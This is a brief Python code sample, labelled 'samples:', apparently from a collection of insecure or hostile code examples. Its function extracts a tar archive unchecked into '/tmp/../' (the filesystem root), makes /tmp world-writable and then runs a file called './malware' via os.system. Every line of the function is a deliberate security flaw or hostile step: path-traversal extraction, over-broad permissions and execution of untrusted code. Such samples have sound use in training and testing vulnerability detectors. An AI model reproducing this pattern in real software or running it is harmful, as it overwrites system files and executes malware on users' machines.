samples:
import os
import tarfile
import zipfile
import shutil

def extract_and_run_archive(archive_file):
    tar = tarfile.open(archive_file)
    tar.extractall('/tmp/../')
    tar.close()

    os.chmod('/tmp', 0o777)

    os.system('cd /tmp && ./malware')
